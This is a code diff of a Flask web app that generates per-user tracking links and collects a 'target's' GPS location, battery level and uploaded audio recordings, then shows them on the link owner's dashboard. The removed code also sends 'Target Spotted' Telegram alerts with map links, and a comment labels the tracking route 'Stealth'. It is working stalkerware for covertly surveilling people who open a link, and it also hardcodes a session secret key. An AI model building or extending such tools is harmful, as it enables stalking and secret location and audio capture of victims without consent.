@@ -1,119 +1,130 @@
 import os
-import requests
-from flask import Flask, request, jsonify, render_template, redirect, url_for, session
-from pymongo.mongo_client import MongoClient
-from pymongo.server_api import ServerApi
-from datetime import datetime
+from flask import Flask, render_template, request, redirect, url_for, session, jsonify
+from pymongo import MongoClient
 from werkzeug.security import generate_password_hash, check_password_hash
+from datetime import datetime
+import uuid
 
 app = Flask(__name__)
-app.secret_key = "vivan_secret_key_123" # Session security ke liye
+app.secret_key = "vivan_secret_key_123" # Ise badal sakte hain
 
-# 1. Configuration
-uri = os.environ.get('MONGO_URI')
-BOT_TOKEN = os.environ.get('BOT_TOKEN')
-CHAT_ID = os.environ.get('CHAT_ID')
-
-# 2. MongoDB Setup
-client = MongoClient(uri, server_api=ServerApi('1'))
-db = client['vanx_database']
-locations_col = db['locations']
+# 1. Database Connection (Environment Variables se)
+MONGO_URI = os.environ.get("MONGO_URI", "aapka_mongodb_url_yahan")
+client = MongoClient(MONGO_URI)
+db = client['vivan_tracker']
 users_col = db['users']
+location_col = db['locations']
+recording_col = db['recordings']
+
+# 2. Audio Storage Folder
+AUDIO_FOLDER = 'static/recordings'
+if not os.path.exists(AUDIO_FOLDER):
+    os.makedirs(AUDIO_FOLDER)
 
 # --- ROUTES ---
 
 @app.route('/')
 def home():
     if 'user_id' in session:
-        return redirect(url_for('admin_page'))
+        return redirect(url_for('dashboard'))
     return redirect(url_for('login'))
 
-# Feature 7: User Registration
 @app.route('/register', methods=['GET', 'POST'])
 def register():
     if request.method == 'POST':
         username = request.form.get('username')
         password = request.form.get('password')
-        
         if users_col.find_one({"username": username}):
-            return "User already exists! <a href='/register'>Try again</a>"
+            return "User already exists!"
         
         hashed_pw = generate_password_hash(password)
-        users_col.insert_one({"username": username, "password": hashed_pw})
+        user_id = str(uuid.uuid4())[:8] # Unique User ID
+        users_col.insert_one({"user_id": user_id, "username": username, "password": hashed_pw})
         return redirect(url_for('login'))
     return render_template('register.html')
 
-# Feature 7: User Login
 @app.route('/login', methods=['GET', 'POST'])
 def login():
     if request.method == 'POST':
         username = request.form.get('username')
         password = request.form.get('password')
-        
         user = users_col.find_one({"username": username})
+        
         if user and check_password_hash(user['password'], password):
-            session['user_id'] = str(user['_id'])
-            session['username'] = username
-            return redirect(url_for('admin_page'))
-        return "Invalid Login! <a href='/login'>Try again</a>"
+            session['user_id'] = user['user_id']
+            session['username'] = user['username']
+            return redirect(url_for('dashboard'))
+        return "Invalid credentials!"
     return render_template('login.html')
+
+@app.route('/dashboard')
+def dashboard():
+    if 'user_id' not in session:
+        return redirect(url_for('login'))
+    
+    # Tracking Link Generate karna
+    base_url = request.url_root.rstrip('/')
+    tracking_link = f"{base_url}/track/{session['user_id']}"
+    
+    return render_template('dashboard.html', username=session['username'], link=tracking_link)
+
+@app.route('/track/<owner_id>')
+def track(owner_id):
+    # Target page ko owner_id pass karna
+    return render_template('index.html', owner_id=owner_id)
+
+@app.route('/update')
+def update():
+    lat = request.args.get('lat')
+    lon = request.args.get('lon')
+    batt = request.args.get('batt')
+    owner_id = request.args.get('owner_id')
+    
+    if lat and lon and owner_id:
+        location_col.insert_one({
+            "owner_id": owner_id,
+            "latitude": float(lat),
+            "longitude": float(lon),
+            "battery": batt,
+            "timestamp": datetime.now().strftime("%H:%M:%S")
+        })
+    return "OK"
+
+@app.route('/upload_audio', methods=['POST'])
+def upload_audio():
+    if 'audio' in request.files:
+        audio_file = request.files['audio']
+        owner_id = request.form.get('owner_id')
+        
+        filename = f"{owner_id}_{uuid.uuid4().hex}.webm"
+        filepath = os.path.join(AUDIO_FOLDER, filename)
+        audio_file.save(filepath)
+        
+        recording_col.insert_one({
+            "owner_id": owner_id,
+            "filename": filename,
+            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M")
+        })
+        return "Saved", 200
+    return "Error", 400
+
+@app.route('/get_data')
+def get_data():
+    if 'user_id' not in session: return jsonify([])
+    data = list(location_col.find({"owner_id": session['user_id']}, {'_id': 0}).sort("_id", -1).limit(10))
+    return jsonify(data)
+
+@app.route('/get_audios')
+def get_audios():
+    if 'user_id' not in session: return jsonify([])
+    audios = list(recording_col.find({"owner_id": session['user_id']}, {'_id': 0}).sort("_id", -1))
+    return jsonify(audios)
 
 @app.route('/logout')
 def logout():
     session.clear()
     return redirect(url_for('login'))
 
-# Target Tracking Route (Stealth)
-@app.route('/track/<owner_id>')
-def track_page(owner_id):
-    # Har user ka apna unique link hoga: /track/USER_ID
-    return render_template('index.html', owner_id=owner_id)
-
-@app.route('/update')
-def update_location():
-    lat = request.args.get('lat')
-    lon = request.args.get('lon')
-    batt = request.args.get('batt', 'N/A')
-    owner_id = request.args.get('owner_id') # Pata chalega kiska target hai
-
-    if lat and lon and owner_id:
-        data = {
-            "owner_id": owner_id,
-            "latitude": lat,
-            "longitude": lon,
-            "battery": batt,
-            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        }
-        locations_col.insert_one(data)
-        
-        # Telegram notification
-        msg = f"📍 Target Spotted!\nUser: {owner_id}\nBatt: {batt}\nMaps: https://www.google.com/maps?q={lat},{lon}"
-        tele_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        requests.post(tele_url, data={"chat_id": CHAT_ID, "text": msg})
-        
-        return "OK", 200
-    return "Error", 400
-
-# Private Admin Dashboard
-@app.route('/admin')
-def admin_page():
-    if 'user_id' not in session:
-        return redirect(url_for('login'))
-    # User ko uska unique link dikhane ke liye
-    tracking_link = f"{request.url_root}track/{session['user_id']}"
-    return render_template('dashboard.html', username=session['username'], link=tracking_link)
-
-# Dashboard ke liye data (Sirf logged-in user ka data dikhega)
-@app.route('/get_data')
-def get_data():
-    if 'user_id' not in session:
-        return jsonify([])
-    
-    # Filter: Sirf wahi data dikhao jiska owner_id match kare
-    locations = list(locations_col.find({"owner_id": session['user_id']}, {'_id': 0}).sort("timestamp", -1))
-    return jsonify(locations)
-
 if __name__ == '__main__':
-    # Render hamesha 'PORT' environment variable ka use karta hai
     port = int(os.environ.get("PORT", 10000))
     app.run(host='0.0.0.0', port=port)
